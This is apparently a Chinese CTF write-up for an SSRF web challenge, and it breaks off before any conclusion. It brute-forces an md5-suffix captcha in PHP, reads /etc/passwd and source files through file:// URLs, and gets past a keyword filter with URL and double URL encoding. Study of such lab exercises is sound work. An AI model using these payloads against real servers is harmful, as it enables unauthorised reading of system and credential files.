Captcha的地方写着代码：substr(md5(captcha), -6, 6) == "974961"，很明显验证码的md5值的后六位要等于指定的数字。
    '''
          <?php
for ($i=0; $i < 1000000000; $i++) {
    $a = substr(md5($i), -6, 6);
    if ($a == "fc6943") {   //此处为==后面的内容
        echo $i;   //输出验证码
        break;
    }
}
?>
  '''


解决了验证码的问题后，我们可以试着通过SSRF中URL伪协议file://来访问服务器的文件，例如/etc/passwd
url=file:///etc/passwd&captcha=*****
接着试试能不能访问/flag文件
url=file:///flag&captcha=*****
再试试看能不能读网页的源代码
url=file:///var/www/html/index.php&captcha=*****
******************code************************
<?php
error_reporting(0);
session_start();
require_once "lib.php";
init();
 
$is_die = 0;
$is_post = 0;
$die_mess = '';
$url = '';
 
if (isset($_POST['url']) && isset($_POST['captcha']) && !empty($_POST['url']) && !empty($_POST['captcha']))
{
    $url = $_POST['url'];
    $captcha = $_POST['captcha'];
    $is_post = 1;
    if ( $captcha !== $_SESSION['answer'])
    {
        $die_mess = "wrong captcha";
        $is_die = 1;
    }
    if ( preg_match('/flag|proc|log/i', $url) )
    {
        $die_mess = "hacker";
        $is_die = 1;
    }
}

阅读源码，发现确实对flag进行了过滤 preg_match('/flag|proc|log/i', $url) ，那么就需要对preg_match函数进行绕过。
同时因为/i 表明不区分大小写，因此无法通过大小写绕过。试试URL编码，file:///%66%6c%61%67
url=file:///%66%6c%61%67&captcha=*****
一次不行进行二次编码：
url=file:///%25%36%36%25%36%63%25%36%31%25%36%37&captcha=*****
